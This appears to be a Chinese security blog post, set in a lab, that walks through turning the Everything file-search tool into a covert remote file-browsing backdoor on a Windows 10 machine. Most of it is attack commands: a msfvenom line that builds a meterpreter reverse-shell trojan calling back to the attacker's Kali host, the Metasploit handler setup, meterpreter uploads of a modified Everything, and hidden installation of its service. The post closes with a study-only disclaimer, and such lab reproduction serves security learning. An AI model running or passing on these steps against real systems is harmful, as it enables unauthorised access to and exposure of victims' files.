## 0x00 Everything简介：

“Everything”是一个运行于Windows系统，基于文件、文件夹名称的快速搜索引擎。

“Everything”在搜索之前就会把所用的文件和文件夹都列出来，这一点与Windows自带的搜索系统不一样，所以我们称之为“Everything”。

在搜索框输入文字，它就会只显示过滤后的文件和目录。

## 0x01 搭建测试环境及配置Everything

### 测试环境

攻击机（kali） 192.168.41.132

被害机（win10） 192.168.41.129

### Everything配置

建议服务器端口不与FTP和HTTP的默认端口相同

![](https://image.3001.net/images/20210122/1611305558_600a9256d4df0b1ee6fae.png!small)![](https://image.3001.net/images/20210122/1611305649_600a92b1074ed369d8000.png!small)

其中：

-install-client-service 安装客户服务

-start-client-service 启动服务

![](https://image.3001.net/images/20210122/1611305695_600a92dfaff2313eafde7.png!small)

## 0x02 漏洞复现：

### 1、选用的win10环境，所以直接kali生成一个木马，上传exe(木马)

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.41.132 lport=4444 -f
exe -o /root/e.exe

msfconsole进行攻击，拿到shell

msf > use exploit/multi/handler #加载模块

msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
#设置payloadmsf exploit(multi/handler) > set lhost kali的ip #设置kali的ipmsf
exploit(multi/handler) > set lport 1211 #设置kali的端口msf exploit(multi/handler) >
exploit #执行

### 2、上传已经修改好的everything

meterpreter > upload -r /root/Everything.exe c:\\\windows\\\temp

meterpreter > upload -r /root/Everything.ini c:\\\windows\\\temp

###
![](https://image.3001.net/images/20210122/1611305774_600a932e30db24f399e77.png!small)![](https://image.3001.net/images/20210122/1611305786_600a933aaa0b093e3dfdc.png!small)3、启动everything

execute -f 'C:\windows\temp\Everything.exe' -a -install-client-service –H

execute -f 'C:\windows\temp\Everything.exe' -a -start-client-service –H

![](https://image.3001.net/images/20210122/1611305851_600a937b614276b34b17f.png!small)

### 4、访问168.41.129:8088->输入开始设置的everything的密码

![](https://image.3001.net/images/20210122/1611305880_600a9398df776eb282de9.png!small)

最后说一句：“大佬”腻害~~慕了慕了

PS：本文仅供学习，可在虚拟机搭环境复现，勿用做非授权测试。。。

